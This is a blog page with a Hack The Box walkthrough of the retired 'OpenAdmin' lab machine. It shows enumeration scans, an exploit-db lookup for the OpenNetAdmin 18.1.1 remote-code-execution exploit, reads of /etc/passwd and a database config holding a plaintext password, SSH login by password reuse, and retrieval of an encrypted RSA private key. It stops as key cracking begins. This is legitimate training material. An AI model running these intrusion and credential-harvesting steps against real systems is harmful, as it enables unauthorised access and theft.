@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.70.0 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="author" content="Tiago Tavares">
+<meta name="keywords" content="hackthebox">
+<meta name="description" content="OpenAdmin - Hack The Box retired machine walkthrough.">
+
+
+<meta property="og:description" content="OpenAdmin - Hack The Box retired machine walkthrough.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenAdmin - Hack The Box (Retired)">
+<meta name="twitter:title" content="OpenAdmin - Hack The Box (Retired)">
+<meta property="og:url" content="https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+<meta property="twitter:url" content="https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+<meta property="og:site_name" content="debugging the life">
+<meta property="og:description" content="OpenAdmin - Hack The Box retired machine walkthrough.">
+<meta name="twitter:description" content="OpenAdmin - Hack The Box retired machine walkthrough.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-04-23T16:31:51">
+  
+  
+    <meta property="article:modified_time" content="2020-04-23T16:31:51">
+  
+  
+  
+    
+      <meta property="article:section" content="📜Walkthroughs">
+    
+      <meta property="article:section" content="👨‍💻HackTheBox">
+    
+  
+  
+    
+      <meta property="article:tag" content="hackthebox">
+    
+      <meta property="article:tag" content="hacking">
+    
+      <meta property="article:tag" content="ctf">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@tiagotavares_">
+
+
+  <meta name="twitter:creator" content="@tiagotavares_">
+
+
+
+
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589566578/blog/openadmin_lxturs.webp">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589566578/blog/openadmin_lxturs.webp">
+
+
+
+
+
+  <meta property="og:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+  <meta property="twitter:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+
+
+    <title>OpenAdmin - Hack The Box (Retired)</title>
+
+    <link rel="icon" href="images/favicon-32x32.png">
+    
+
+    
+
+    <link rel="canonical" href="https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://tiagotavares.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-36987137-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://tiagotavares.io/">debugging the life</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://tiagotavares.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://tiagotavares.io/#about">
+          <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Tiago Tavares</h4>
+        
+          <h5 class="sidebar-profile-bio">Eternal student, cybersecurity pro, husband, runner.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/tiagotvrs" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/tiagotvrs/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/tiagotavares_" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      OpenAdmin - Hack The Box (Retired)
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-04-23T16:31:51-03:00">
+        
+  April 23, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/walkthroughs">📜Walkthroughs</a>, 
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/hackthebox">👨‍💻HackTheBox</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>OpenAdmin - Hack The Box retired machine walkthrough.</p>
+<h2 id="enumeration">🔎Enumeration</h2>
+<pre><code># nmap -sV -A -O 10.10.10.171
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 23:16 -03
+Nmap scan report for 10.10.10.171
+Host is up (0.21s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/23%OT=22%CT=1%CU=30878%PV=Y%DS=2%DC=T%G=Y%TM=5EA24C0
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   217.21 ms 10.10.14.1
+2   217.88 ms 10.10.10.171
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds    enter code here
+</code></pre>
+<p>Nothing found when enum  port 80 with Nikto. =(</p>
+<pre><code># nikto -h 10.10.10.171
+    - Nikto v2.1.6
+    ---------------------------------------------------------------------------
+    + Target IP:          10.10.10.171
+    + Target Hostname:    10.10.10.171
+    + Target Port:        80
+    + Start Time:         2020-04-23 23:21:07 (GMT-3)
+    ---------------------------------------------------------------------------
+    + Server: Apache/2.4.29 (Ubuntu)
+    + The anti-clickjacking X-Frame-Options header is not present.
+    + The X-XSS-Protection header is not defined. This header can hint to the user agent
+    + The X-Content-Type-Options header is not set. This could allow the user agent to re
+    + No CGI Directories found (use '-C all' to force check all possible dirs)
+    + Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime: gzip
+    + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+    + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+</code></pre>
+<p>Bruteforce directories on port 80 with ffuf.</p>
+<pre><code>./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.171/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v0.12
+________________________________________________
+
+:: Method           : GET
+:: URL              : http://10.10.10.171/FUZZ
+:: Follow redirects : false
+:: Calibration      : false
+:: Timeout          : 10
+:: Threads          : 40
+:: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+music                   [Status: 301, Size: 312, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10]
+:: Progress: [20469/20469] :: 173 req/sec :: Duration: [0:01:58] :: Errors: 0 ::
+</code></pre>
+<p>Looking further we got the following apps.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589572138/blog/Image_3_w841je.png" alt="enter image description here"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589572138/blog/Image_4_uiigv9.png" alt="enter image description here"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589572138/blog/Image_5_bbgpa3.png" alt="enter image description here"></p>
+<p>We found an <strong>OpenNetAdmin</strong> service, version <strong>18.1.1</strong>.</p>
+<pre><code>root@kali:~/Documents/htb# searchsploit opennetadmin
+------------------------------------------ ---------------------------------
+ Exploit Title                            |  Path
+------------------------------------------ ---------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execu | php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection E | php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Executi | php/webapps/47691.sh
+------------------------------------------ ---------------------------------
+</code></pre>
+<h2 id="foothold">🚪🚶Foothold</h2>
+<p>OpenNetAdmin has a critical vulnerability, which allow us to execute commands remotely.</p>
+<p>Copy the exploit to your current directory:</p>
+<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/47691.sh .
+</code></pre>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589572468/blog/Image_7_c573aa.png" alt="enter image description here"></p>
+<p>Let&rsquo;s keep enumerating&hellip;🔎</p>
+<pre><code>$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+</code></pre>
+<p>We found something interesting in the app loca/config directory:</p>
+<pre><code>$ ls -lha local/config
+total 16K
+drwxrwxr-x 2 www-data www-data 4.0K Nov 21 16:51 .
+drwxrwxr-x 5 www-data www-data 4.0K Jan  3  2018 ..
+-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php
+-rw-rw-r-- 1 www-data www-data 1.2K Jan  3  2018 motd.txt.example
+-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer
+</code></pre>
+<p>$ cat local/config/database_settings.inc.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+$ona_contexts<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span> (
+  <span style="color:#e6db74">&#39;DEFAULT&#39;</span> <span style="color:#f92672">=&gt;</span> 
+  <span style="color:#66d9ef">array</span> (
+    <span style="color:#e6db74">&#39;databases&#39;</span> <span style="color:#f92672">=&gt;</span> 
+    <span style="color:#66d9ef">array</span> (
+      <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> 
+      <span style="color:#66d9ef">array</span> (
+        <span style="color:#e6db74">&#39;db_type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>,
+        <span style="color:#e6db74">&#39;db_host&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
+        <span style="color:#e6db74">&#39;db_login&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;ona_sys&#39;</span>,
+        <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
+        <span style="color:#e6db74">&#39;db_database&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;ona_default&#39;</span>,
+        <span style="color:#e6db74">&#39;db_debug&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+      ),
+    ),
+    <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Default data context&#39;</span>,
+    <span style="color:#e6db74">&#39;context_color&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;#D3DBFF&#39;</span>,
+  ),
+);
+</code></pre></div><p>Now we have some important infos:</p>
+<ul>
+<li><strong>Usernames</strong>
+<ul>
+<li>jimmy</li>
+<li>joanna</li>
+</ul>
+</li>
+<li><strong>MySQL credentials</strong></li>
+<li><strong>Probable usefull rsa keys</strong></li>
+</ul>
+<p>What about combine some information? 🤔</p>
+<p>Let&rsquo;s try connect on ssh!</p>
+<p>Username: jimmy
+Password: n1nj4W4rri0R!</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589577899/blog/Image_8_rrpjt6.png" alt="enter image description here"></p>
+<p>But we couldn&rsquo;t find any user flag here.</p>
+<pre><code>$ find / -iname &quot;user.txt&quot; 2&gt; /dev/null
+</code></pre>
+<p>Let&rsquo;s try to find something tasty to jimmy user:</p>
+<pre><code>$ find / -type f -user jimmy 2&gt; /dev/null
+...
+/var/www/internal/main.php
+/var/www/internal/logout.php
+/var/www/internal/index.php
+/home/jimmy/.local/share/nano/search_history
+/home/jimmy/.bashrc
+/home/jimmy/.cache/motd.legal-displayed
+/home/jimmy/.profile
+/home/jimmy/.bash_logout
+</code></pre>
+<p>Looking all the files, there is something nice in main.php:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/www/internal/main.php
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">session_start</span>(); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) { <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /index.php&#34;</span>); }; 
+<span style="color:#75715e"># Open Admin Trusted
+</span><span style="color:#75715e"># OpenAdmin
+</span><span style="color:#75715e"></span>$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$output</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
+<span style="color:#75715e">?&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">h3</span>&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/<span style="color:#f92672">h3</span>&gt;
+Click here to logout &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logout.php&#34;</span> <span style="color:#a6e22e">tite </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Logout&#34;</span>&gt;Session
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+</code></pre></div><p><img src="https://pbs.twimg.com/media/Cs7xcktVIAQA2Wi.jpg" alt="enter image description here"></p>
+<p>Maybe there is an application running and showing joanna rsa key</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ netstat -putan
+<span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">360</span> 10.10.10.171:22         10.10.14.34:35318       ESTABLISHED -                   
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -                   
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
+udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*                           -                   
+jimmy@openadmin:~$ 
+
+</code></pre></div><p>Gotcha!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ curl 127.0.0.1:52846/main.php
+&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+&lt;/pre&gt;&lt;html&gt;
+&lt;h3&gt;Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t forget your <span style="color:#e6db74">&#34;ninja&#34;</span> password&lt;/h3&gt;
+Click here to logout &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logout.php&#34;</span> tite <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Logout&#34;</span>&gt;Session
+&lt;/html&gt;
+
+</code></pre></div><p>I tried to logon without a password, with not success. It&rsquo;s needed to brute this key and get its password.</p>
+<p>First we adjust the RSA key to john file model:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/share/john/ssh2john.py joanna.txt &gt; joannarsa.txt
+
+<span style="color:#75715e"># cat joannarsa.txt</span>
+
